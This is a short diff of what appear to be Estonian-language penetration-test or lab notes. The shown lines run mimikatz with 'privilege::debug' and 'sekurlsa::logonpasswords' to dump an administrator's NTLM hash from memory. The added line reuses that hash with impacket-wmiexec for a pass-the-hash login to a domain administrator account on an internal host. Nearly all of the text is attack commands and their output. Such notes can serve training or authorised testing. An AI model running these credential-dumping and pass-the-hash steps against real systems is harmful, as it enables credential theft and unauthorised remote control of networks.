@@ -129,3 +129,4 @@ Käivitame mimikatzi (admin term)
   privilege::debug (tõstame õigusi, et saaks lugeda mälu)
   sekurlsa::logonpasswords
     NTLM: c625e3e2756d9ef01881fa7ed46b49a8
+/usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2
